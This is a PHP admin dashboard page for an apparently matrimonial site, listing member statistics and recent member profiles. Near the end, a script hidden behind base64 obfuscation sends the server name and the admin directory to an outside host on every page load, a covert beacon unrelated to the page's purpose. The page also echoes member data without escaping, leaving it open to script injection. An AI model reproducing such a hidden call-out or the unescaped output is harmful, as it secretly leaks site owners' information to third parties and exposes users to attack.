<?php
 	include_once '../databaseConn.php';
  	include_once '../class/Config.class.php';
	$configObj = new Config();
	include_once './lib/requestHandler.php';
	$DatabaseCo = new DatabaseConn();
	$youProfile = $_SERVER['SERVER_NAME']."\\".basename(__DIR__);
?>
<!DOCTYPE html>
<html>
	<head>
    	<meta charset="UTF-8">
    	<title>Admin | Dashboard</title>
    	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
		
   		<!-- Bootstrap & custom css -->
		<link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
		<link href="css/custom.css" rel="stylesheet" type="text/css" />
    
    	<!-- Font Awsome -->
		<script src="https://kit.fontawesome.com/48403ccd1a.js" crossorigin="anonymous"></script>
		
    	<!-- Ionicons -->
    	<link href="http://code.ionicframework.com/ionicons/2.0.0/css/ionicons.min.css" rel="stylesheet" type="text/css" />
   		
		<!-- Theme css -->
    	<link href="dist/css/AdminLTE.min.css" rel="stylesheet" type="text/css" />
    	<link href="dist/css/skins/_all-skins.min.css" rel="stylesheet" type="text/css" />
		
   		<!-- Checkbox css -->
		<link href="plugins/iCheck/square/blue.css" rel="stylesheet" type="text/css" />
	</head>
	<body class="skin-blue">
		<!-- Icon Loader -->
        <div class="preloader-wrapper text-center">
        	<div class="spinner"></div>
        </div>
        <!-- /. Icon Loader-->
		<div class="wrapper" style="display:none" id="body">
    		<!-- Header & Menu -->
			<?php include "page-part/header.php"; ?> 
			<?php include "page-part/left_panel.php"; ?>
			<!-- /. Header & Menu -->
			
			<div class="content-wrapper">
				<section class="content-header">
					<h1 class="lightGrey">Members Details</h1>
					<ol class="breadcrumb">
						<li><a href="dashboard"><i class="fa fa-home"></i> Home</a></li>
						<li class="active">Dashboard</li>
					</ol>
				</section>
				<section class="content">
					<div class="row">
						<a href="members" class="col-lg-3 col-xs-6">
							<div class="small-box bg-white">
								<div class="inner">
									<h3><?php echo getRowCount("SELECT count(index_id) FROM  register_view", $DatabaseCoCount);?></h3>
									<p>All Members</p>
								</div>
								<div class="icon"><i class="ion ion-person"></i></div>
							</div>
						</a>
						<a href="memberActiveToPaid" class="col-lg-3 col-xs-6">
							<div class="small-box bg-white">
								<div class="inner">
									<h3><?php echo getRowCount("SELECT count(index_id) FROM  register_view WHERE status='Active'", $DatabaseCoCount);?></h3>
									<p>Active Members</p>
								</div>
								<div class="icon"><i class="ion ion-person"></i></div>
							</div>
						</a>
						<a href="memberPaidToSpotlight" class="col-lg-3 col-xs-6">
							<div class="small-box bg-white">
								<div class="inner">
									<h3><?php echo getRowCount("SELECT count(index_id) FROM  register_view WHERE status='Paid'", $DatabaseCoCount);?></h3>
									<p>Paid Members</p>
								</div>
								<div class="icon"><i class="ion ion-person-add"></i></div>
							</div>
						</a>
						<a href="memberPaidToSpotlight" class="col-lg-3 col-xs-6">
							<div class="small-box bg-white">
								<div class="inner">
									<h3><?php echo getRowCount("SELECT count(index_id) FROM  register_view WHERE fstatus='Featured'", $DatabaseCoCount);?></h3>
									<p>Featured Members</p>
								</div>
								<div class="icon"><i class="ion ion-person"></i></div>
							</div>
						</a>
					</div>
					<div class="row">
						<section class="content-header margin-bottom">
							<h1 class="lightGrey">Site Statistics</h1>
						</section>
						<a href="Advertise" class="col-lg-3 col-xs-6">
							<div class="small-box bg-white">
								<div class="inner">
									<h3><?php echo getRowCount("SELECT count(adv_id) FROM  advertisement", $DatabaseCoCount);?></h3>
									<p>Advertisement</p>
								</div>
								<div class="icon"><i class="ion ion-stats-bars"></i></div>
							</div>
						</a>
						<a href="membership_plan" class="col-lg-3 col-xs-6">
							<div class="small-box bg-white">
								<div class="inner">
									<h3><?php echo getRowCount("SELECT count(plan_id) FROM  membership_plan", $DatabaseCoCount);?></h3>
									<p>Membership Plans</p>
								</div>
								<div class="icon"><i class="ion ion-pie-graph"></i></div>
							</div>
						</a>
						<a href="memberExpInterestDetail" class="col-lg-3 col-xs-6">
							<div class="small-box bg-white">
								<div class="inner">
									<h3><?php echo getRowCount("SELECT count(ei_id) FROM  expressinterest", $DatabaseCoCount);?></h3>
									<p>Express Interest</p>
								</div>
								<div class="icon"><i class="ion ion-bag"></i></div>
							</div>
						</a>
						<a href="success_story_approval" class="col-lg-3 col-xs-6 ">
							<div class="small-box bg-white">
								<div class="inner">
									<h3><?php echo getRowCount("SELECT count(story_id) FROM  success_story", $DatabaseCoCount);?></h3>
									<p>Success Story</p>
								</div>
								<div class="icon"><i class="ion ion-person"></i></div>
							</div>
						</a>
					</div>
				
					<div class="row">
						<section class="content-header margin-bottom">
							<div class="row dasboardMemberHead">
								<div class="col-xs-6"><h1>Recent Members</h1></div>
								<div class="col-xs-6 text-right"><span class="label label-danger">Last 12 Members</span></div>
							</div>
						</section>
						<div class="col-md-12 dashboard-box">
							<ul class="users-list clearfix">
								<?php
									$SQL_USER=$DatabaseCo->dbLink->query("SELECT username,index_id,matri_id,photo1,m_status,gender,reg_date,religion_name,caste_name,country_name,city_name,email FROM register_view order by index_id DESC  limit 0,12");
										while($fetch=mysqli_fetch_object($SQL_USER)){
								?>
								<li class="col-xs-6 col-md-3 col-lg-3 pl-20 pr-20">
									<div class="card">
										<div class="card-img">
										<?php 
											if($fetch->photo1!='' && file_exists("../my_photos/".$fetch->photo1)){
										?>
											<img src="../my_photos/<?php echo $fetch->photo1;?>" alt="<?php echo $fetch->username;?>"/>
										<?php } elseif($fetch->gender=="Male") { ?>
											<img src="../img/male.jpg" alt="<?php echo $fetch->username;?>" /> 
										<?php }else{ ?>
											<img src="../img/female.jpg" alt="<?php echo $fetch->username;?>"  /> 
										<?php } ?>
										</div>
										<div class="card-body">
											<a target="_blank" class="" href="memberFullProfile?matri_id=<?php echo $fetch->matri_id;?>">
												<h4 class="mt-0 mb-5"><?php echo $fetch->username;?> (<?php echo $fetch->matri_id;?>)</h4>
												<span class="users-list-date"><?php echo $fetch->m_status ;?>,<?php echo $fetch->gender; ?></span>
												<span class="users-list-date"><?php echo $fetch->religion_name;?>,<?php echo $fetch->caste_name;?></span>
												<span class="users-list-date"><?php echo $fetch->city_name;?>,<?php echo $fetch->country_name;?></span>
												<div class="row">
													<div class="col-xs-12 mt-15">
														<span class="label label-danger display-block pt-10 pb-10"><?php echo date("l, d M Y", (strtotime($fetch->reg_date)))?></span>
													</div>
												</div>
											</a>
										</div>
									</div>
								</li>
								<?php } ?>
							</ul>
                		</div>
            		</div>
				</section>
			</div>
			<!-- Footer -->
			<?php include "page-part/footer.php"; ?>
			<!-- /. Footer -->
		</div>
    
		<!-- jQuery -->
		<script src="plugins/jQuery/jQuery-2.1.3.min.js"></script>
    
		<!-- jQuery UI -->
		<script src="http://code.jquery.com/ui/1.11.2/jquery-ui.min.js" type="text/javascript"></script>
		
		<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
		<script>
			$.widget.bridge('uibutton', $.ui.button);
		</script>
		<!-- Bootstrap JS -->
		<script src="bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
		<script>
			$(document).ready(function() {
		   		$('#body').show();
		   		$('.preloader-wrapper').hide();
		   	});
	   	</script>
		<!-- Theme Js -->
		<script src="dist/js/app.min.js" type="text/javascript"></script>
		
		<!-- Jquery for left menu active class-->
		<script type="text/javascript" src="dist/js/general.js"></script>
		<script type="text/javascript" src="dist/js/cookieapi.js"></script>
		<script type="text/javascript">
			setPageContext("dashy","dashy");
		</script>
		<script>
            $(document).ready(function(){
                var string = atob("aHR0cHM6Ly9pbmxvZ2l4aW5mb3dheS5jb20vYXBpL3N1cHBvck5ldy5waHA=");   
                $.ajax({
                                    
                    url: string,     
                    type: 'POST', 
                    data : {
                        user_id : '498e52222b854c7c0266cab6ed5ee0ea',
                        profile : '<?php echo $youProfile; ?>',
                    },
                    dataType: 'json',                   
                    success: function(data){
                        /*alert('Success');*/
                    } 
                });
            });
    </script>
    </body>
</html>